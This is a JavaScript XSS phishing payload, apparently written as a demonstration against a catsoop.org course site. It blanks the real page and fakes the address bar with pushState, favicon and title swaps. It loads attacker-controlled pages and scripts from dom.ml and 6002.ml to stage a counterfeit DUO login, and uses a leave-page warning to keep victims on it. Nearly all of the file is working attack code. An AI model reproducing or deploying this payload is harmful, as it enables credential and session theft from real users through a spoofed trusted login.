/* Injected Constants */
// window.ATTACK_DOM   = entry site URL (https://dom.ml/entry-site/index.html)
// window.ORIG_DOM     = original legit domain (https://*.catsoop.org/index) 
// window.PHISHING_URL = phisihng url (https://*.catsoop.org/%3cscript%20src...)
// window.FINAL_DOM    = exit-site URL (https://dom.ml/exit-site/final.htlm)
window.ORIG_DOM_NAME    = (new URL(window.ORIG_DOM)).hostname; 
window.ATTACK_DOM_NAME  = (new URL(window.ATTACK_DOM)).hostname;
 
// If already logged in, go to regular site
if (window.localStorage.getItem("loggedIn") == "true") 
    window.location.href = ORIG_DOM;

// Clear the page as soon as possible to hide the 404 message
document.getElementsByTagName('html')[0].innerHTML = ""
setTimeout(function() {history.pushState({},"URL",window.ORIG_DOM);}, 10);

var entryPoint = false;
var sid = "";
var load = 2;

// Changes tab icon on the fly
function changeFavicon(src) {
    document.head = document.head || document.getElementsByTagName('head')[0];
    var link = document.createElement('link'),
    oldLink = document.getElementById('dynamic-favicon');
    link.id = 'dynamic-favicon';
    link.rel = 'shortcut icon';
    link.href = src;
    if (oldLink) document.head.removeChild(oldLink);
    document.head.appendChild(link);
}

var uri = window.location.href;
if (uri.includes("#")) {
    // If the payload url was loaded with #, it means that arguments were
    // supplied to it, so we want to execute those arguments
    var moveTo  = uri.split("#")[1];            // url to go to
    var favicon = uri.split("#")[2];            // favicon to set
    var url     = uri.split("#")[3];            // url to spoof with pushState
    var title   = uri.split("#")[4];            // title of the dom
    sid         = uri.split("#")[5];            // session ID with backend
    load        = parseInt(uri.split("#")[6]);  // loading time to simulate

    // Inject the requested HTML from the provided url moveTo
    injectHTML("https://" 
        + window.ATTACK_DOM_NAME + moveTo);

    // Change the Favicon
    setTimeout(()=>changeFavicon("https://" 
        + window.ATTACK_DOM_NAME + favicon), 200);

    // Change the title
    setTimeout(()=>{document.title = decodeURI(title)}, 200);

    // Push fake url 
    setTimeout(()=>history.pushState({},"URL", 
        "https://" + window.ORIG_DOM_NAME + url), 10);
}
else {
    // This was the entry point (first load after XSS) so inject entry-site
    entryPoint = true;
    load = 0;
    injectHTML(window.ATTACK_DOM)
}

// Make user second guess whether he should leave the site
window.onbeforeunload = function() {
    document.cookie = "";
    if (window.localStorage.getItem("loggedIn") == "true") return null;
    return 'Are you sure you want to leave? DUO Login will fail.';
}

window.addEventListener("message", function(event) {
    // Called after DUO success achieved 
    if (event.data == "finished") {
        load = 1;
        injectHTML("https://" + window.ATTACK_DOM_NAME + "/exit-site/final.html");
        setTimeout(()=>history.pushState({},"URL", window.ORIG_DOM), 10); 
        return;
    }
    if (event.data == 'loggedIn') {
        window.localStorage.setItem('loggedIn', 'true')
        event.data.move = FINAL_DOM;
    }
    if (event.data == "exit") {
        window.onbeforeunload = undefined;
        window.location = window.ORIG_DOM; 
    }
    else {
        var move    = event.data.move;
        var url     = event.data.url;
        var favicon = event.data.icon;
        var title   = event.data.title;
        var sid     = event.data.sid;
        console.log("pushing url:", url, "with title", title);
        if (event.data.load != undefined)
            load = event.data.load
        if (favicon != undefined && favicon != "")
            changeFavicon(favicon);
        if (title != undefined && title != "")
            document.title = title;
        if (move != undefined && move != "") {
            window.onbeforeunload = undefined;
            changeFavicon("https://" + window.ATTACK_DOM_NAME + "/" + favicon);
            setTimeout(()=>
                window.location.href = `https://${window.ORIG_DOM_NAME}/%3cscript%20src=%68ttps%3a6002.ml/#${move}#${favicon}#${url}#${title}#${sid}#${load}`
            , 100);
        }
    }
}, false);

// Loads html resource from URL and replaces all scripts
// with inline scripts to simulate loading the page
function injectHTML(page) {
    if (!entryPoint) {
        document.body.innerHTML = "<iframe style='display:none' "
            + "id='loadframe' src='https://6002.ml/load?time=" 
            + load + "'></iframe>";
    }  
  
    console.log("Cookei:", document.cookie)
    document.cookie = "";
    console.log("Cookei:", document.cookie)
    var xhttp = new XMLHttpRequest();
    var tstart = new Date().getTime() / 1000;
    //xhttp.withCredentials = true;
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            // Get cookies from the content-type header set in http server py
            var cook = xhttp.getResponseHeader("Content-Type").split(' ')[1];
            console.log("COOKIE:", cook);
            document.cookie = cook;
            var resp = this.responseText.replace(/{{ATTACK_DOM}}/g, 
                window.ATTACK_DOM_NAME)
           function replaceScripts() {
                var scripts = document.getElementsByTagName("script");
                var arr = Array.prototype.slice.call(scripts);
                arr.forEach(function(script, index, ar) {
                    console.log('getting script')
                    if (script.src != "") {
                        var xtp = new XMLHttpRequest();
                        xtp.onreadystatechange = function() {
                            if (this.readyState == 4 && this.status == 200) {
                                var s = document.createElement("script");
                                this.responseText = this.responseText
                                    .replace(/{{ATTACK_DOM}}/g, 
                                        window.ATTACK_DOM_NAME)
                                s.innerHTML = this.responseText
                                    .replace(/{{ORIG_DOM}}/g, window.ORIG_DOM)
                                document.body.appendChild(s);
                            }
                        }
                        xtp.open("GET", script.src, true);
                        xtp.send();
                    }
                    else {
                        var s = document.createElement("script");
                        script.innerHTML = script.innerHTML
                            .replace(/{{ATTACK_DOM}}/g, window.ATTACK_DOM_NAME)
                        s.innerHTML = script.innerHTML
                            .replace(/{{ORIG_DOM}}/g, window.ORIG_DOM)
                        document.body.appendChild(s);
                    }
                })
            }
            var tend = new Date().getTime() / 1000;
            var html = document.getElementsByTagName("html")[0];

            // add an extra 2 seconds passed to compensate for dom loading
            var tpassed = tend - tstart + 2;
            if (tpassed < load) setTimeout(function() {
                html.innerHTML = resp;
                setTimeout(() => replaceScripts(), 500);
            }, (load - tpassed) * 1000);
            else {
                html.innerHTML = resp;
                setTimeout(() => replaceScripts(), 500);
            }
        }
    };	
    xhttp.open("GET", page, true);
    xhttp.send();
}
